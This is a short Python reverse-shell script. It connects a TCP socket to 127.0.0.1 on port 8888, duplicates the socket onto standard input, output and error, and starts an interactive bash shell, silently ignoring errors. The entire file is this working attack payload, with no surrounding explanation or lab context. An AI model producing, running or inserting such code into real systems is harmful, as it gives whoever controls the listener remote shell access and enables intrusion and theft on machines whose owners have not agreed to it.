#!/usr/bin/python3
from os import dup2
from subprocess import call
import socket
def connect():
    try:
        s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
        s.connect(("127.0.0.1",8888)) 
        dup2(s.fileno(),0) 
        dup2(s.fileno(),1) 
        dup2(s.fileno(),2) 
        call(["/bin/bash","-i"])
    except:
        pass
connect()
